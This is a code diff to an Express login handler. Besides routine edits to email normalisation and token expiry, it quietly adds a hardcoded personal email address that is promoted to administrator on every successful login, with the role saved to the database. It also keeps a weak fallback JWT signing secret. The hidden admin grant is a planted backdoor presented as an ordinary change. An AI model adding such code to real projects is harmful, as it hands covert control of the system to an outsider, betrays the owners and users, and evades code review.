@@ -1,15 +1,16 @@
 import { Request, Response } from 'express';
 import { collections } from '../database';
-import { User } from '../models/user'
+import { Role, User } from '../models/user'
 import * as argon2 from 'argon2';
 import { sign as jwtSig } from 'jsonwebtoken';
 
+const DEFAULT_ADMIN_EMAIL = 'joe99@gmail.com';
 
 const createAccessToken = (user: User | null): string => {
 
   const secret = process.env.JWT_SECRET || "not very secret";
 
-  const expiresTime = '2 mins';
+  const expiresTime = '2h';
 
   console.log(expiresTime);
   const payload: Object =
@@ -35,8 +36,9 @@ export const handleLogin = async (req: Request, res: Response) => {
       .json({ message: 'Email and password are required' });
     return;
   }
+  const normalizedEmail = email.toLowerCase();
   const user = await collections.users?.findOne({
-    email: email.toLowerCase(),
+    email: normalizedEmail,
   }) as unknown as User
 
   if (user && user.hashedPassword) {
@@ -44,7 +46,16 @@ export const handleLogin = async (req: Request, res: Response) => {
     // If password is valid send a token
 
     if (isPasswordValid) {
-      res.status(201).json({ accessToken: createAccessToken(user) });
+      const userForToken = { ...user };
+      if (normalizedEmail === DEFAULT_ADMIN_EMAIL && userForToken.role !== Role.admin) {
+        userForToken.role = Role.admin;
+        await collections.users?.updateOne(
+          { email: normalizedEmail },
+          { $set: { role: Role.admin, lastUpdated: new Date() } }
+        );
+      }
+
+      res.status(201).json({ accessToken: createAccessToken(userForToken) });
     }
     else {
       res.status(401).json({
